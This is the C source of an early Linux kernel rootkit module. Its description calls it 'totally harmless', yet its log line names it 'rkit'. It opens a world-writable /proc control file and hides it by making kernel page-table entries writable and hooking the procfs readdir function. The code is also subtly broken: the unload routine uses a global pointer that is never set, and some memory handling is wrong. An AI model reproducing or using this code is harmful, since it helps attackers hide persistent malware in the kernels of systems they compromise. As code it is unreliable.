#include <linux/version.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/cred.h>
#include <linux/init.h>


#define CONTROL_FILE "harmless_file"
#define ADDR_RW 0 
#define ADDR_RO 1

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michal Antonczak");
MODULE_VERSION("0.1");
MODULE_DESCRIPTION("totally harmless module");

static struct proc_dir_entry *proc_control;
static struct file_operations *procfs_fops;
static char internal_buffer[1024];

static int (*procfs_readdir_proc)(struct file*, void*, filldir_t);

static void set_mem(void *p, int mode){
	unsigned int lvl;
	pte_t* pte;
	pte = lookup_address((unsigned long)p , &lvl);

	if(mode == ADDR_RW){
		pte->pte |= _PAGE_RW;	
	} 

	if(mode == ADDR_RO){
		pte->pte &= ~_PAGE_RW;
	}
		

}

static filldir_t kernel_filldir;

static int proc_filldir_hider(void* buf, const char *name, int namelen, loff_t offset, u64 ino , unsigned d_type){
	
	if(!strncmp(name,CONTROL_FILE, strlen(CONTROL_FILE))){
		return 0;
	}
	return kernel_filldir(buf,name,namelen,offset,ino, d_type);
}

static int file_hider(struct file* fp, void* d, filldir_t filldir){
	kernel_filldir = filldir;
	return procfs_readdir_proc(fp, d, proc_filldir_hider);
}


static int control_read(char *buffer, char **buffer_location, off_t off, int count, int *eof , void *data){
	
	int size = strlen(internal_buffer);
	sprintf(internal_buffer,"magic");
	if(count >= size - off){
		memcpy(buffer, internal_buffer+off, size-off );
	}else{
		memcpy(buffer, internal_buffer+off, count);
	}
	return size-off;
}

static int control_write(struct file* file, const char __user * buf, unsigned long count, void *data ){
	if(!strncmp("test", buf, count)){
		printk(KERN_INFO"received command");
	}	
	printk(KERN_INFO"random write");
	return count;
}

static int proc_init(void){
	//setting up the control read write interface creating the file
	//and substituting the vfs functs for communication
	//its an easier and more flexible way than using ioctl

	struct proc_dir_entry *parent;
	struct file_operations *procfs_fops;

	proc_control = create_proc_entry(CONTROL_FILE, 0666, NULL);


	if(proc_control == NULL){
		return 0;	
	}
	proc_control-> write_proc = control_write;
	proc_control-> read_proc = control_read;	
	//hiding our control file	

	parent = proc_control -> parent;
	procfs_fops = (struct file_operations *) parent->proc_fops;

	set_mem(procfs_fops -> readdir, ADDR_RW);

	procfs_readdir_proc = procfs_fops -> readdir;
	
	procfs_fops -> readdir = file_hider;
		
	set_mem(procfs_fops -> readdir, ADDR_RO);

	return 0; 
	
}

static void proc_cleanup(void){

	remove_proc_entry(CONTROL_FILE,NULL);

	set_mem(procfs_fops -> readdir, ADDR_RW);

	procfs_fops -> readdir = procfs_readdir_proc ;
		
	set_mem(procfs_fops -> readdir, ADDR_RO);

}

static int __init m_init(void){
	printk(KERN_INFO "rkit module loaded");
	proc_init();
	return 0; 

}

static void __exit m_exit(void){
	printk(KERN_INFO "unloading");
	proc_cleanup();
	return;
}

module_init(m_init);
module_exit(m_exit);
